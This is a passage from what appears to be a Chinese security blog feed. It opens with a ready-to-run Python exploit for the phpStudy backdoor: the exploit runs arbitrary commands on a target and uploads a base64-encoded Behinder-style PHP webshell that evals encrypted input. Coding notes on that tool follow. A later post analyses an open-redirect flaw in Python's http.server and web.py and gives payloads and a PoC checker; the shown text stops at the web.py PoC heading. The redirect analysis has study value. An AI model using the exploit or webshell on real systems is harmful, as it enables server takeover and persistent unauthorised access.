class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url</span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="漏洞复现及php传shell"><a href="#漏洞复现及php传shell" class="headerlink" title="漏洞复现及php传shell"></a>漏洞复现及php传shell</h3><p><a href="http://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more">PHP文件写入</a></p>
<p><a href="http://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">phpstudy后门漏洞复现</a></p>
<h3 id="代码编写总结"><a href="#代码编写总结" class="headerlink" title="代码编写总结"></a>代码编写总结</h3><blockquote>
<p>记录一些忘了的点，想到哪说哪</p>
</blockquote>
<h4 id="关闭https警告"><a href="#关闭https警告" class="headerlink" title="关闭https警告"></a>关闭https警告</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure>
<h4 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()  <span class="comment">#读取为一个列表</span></span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="requests请求后解析时自动判断编码问题"><a href="#requests请求后解析时自动判断编码问题" class="headerlink" title="requests请求后解析时自动判断编码问题"></a>requests请求后解析时自动判断编码问题</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">自动判断编码后，使用requests.text有时候会乱码，直接一点，在返回解析时指定编码</span><br><span class="line"></span><br><span class="line">result.encoding = <span class="string">'gbk'</span></span><br></pre></td></tr></table></figure>
<h4 id="面向对象编程（类）高级用法"><a href="#面向对象编程（类）高级用法" class="headerlink" title="面向对象编程（类）高级用法"></a>面向对象编程（类）高级用法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">为了保证安全性以及代码的健壮性，不直接定义私有变量，而是通过提示私有变量，通过装饰器来实现,并且使用object来继承，方便高级调用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">初始化的时候带了了参数，所以在实例化的时候要带参数（脑子一抽风），懒得改了，直接在实例化的时候传两个空参数进去，后面再进行自己构造调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)  <span class="comment">#空参数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url					<span class="comment">#具体调用</span></span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="argparse参数化解析编程"><a href="#argparse参数化解析编程" class="headerlink" title="argparse参数化解析编程"></a>argparse参数化解析编程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">定义description以及usage，为了防止在调用命令时出现的如反斜杠之类的参数被转义，使用单双引号等避免转义，略显麻烦</span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在定义参数时，后面可能跟不止一个参数，尤其是执行系统命令，为了方便，不限定后面接的数量（nargs=argparse.REMAINDER）；同时使用解析参数的时候将后面跟的参数（以空格分开的）拼接成一个字符串</span><br><span class="line"></span><br><span class="line">parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br></pre></td></tr></table></figure>
<p>主要是一些细节上的点记不清了，特此记录一下</p>
<h3 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h3><p><a href="https://github.com/demossl/phpstudy_backdoor_getshell" target="_blank" rel="noopener">github地址</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://yzddmr6.tk/posts/phpstudy-backdoor/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/phpstudy-backdoor/</a></p>
<p><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
]]></content>
      <categories>
        <category>POC/EXP编写</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>poc</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy后门漏洞复现</title>
    <url>/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件写入</title>
    <url>/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>webshell写入</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转漏洞白盒实践</title>
    <url>/2018/11/21/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%99%BD%E7%9B%92%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote>
<p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p>
</blockquote>
<h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul>
<li><p>python一键启动web服务器 <code>python -m http.server</code></p>
<p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p>
</li>
<li><p>http.server模块下包含几个类</p>
<ul>
<li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li>
<li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li>
<li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li>
<li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li>
</ul>
</li>
<li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt></p>
</li>
<li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p>
</li>
<li><p>分析SimpleHTTPRequestHandler类源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语  		 句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是			 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p>
<ul>
<li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li>
<li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li>
<li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt></li>
</ul>
</li>
<li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p>
</li>
<li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt></p>
<p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt></p>
</li>
<li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p>
<p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt></p>
</li>
</ul>
<h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p>
<ul>
<li><p>简单的web.py代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt></p>
</li>
<li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p>
<p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt></p>
</li>
</ul>
<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul>
<li><p>http.server——poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt></p>
</li>
<li><p>web.py——poc</p>
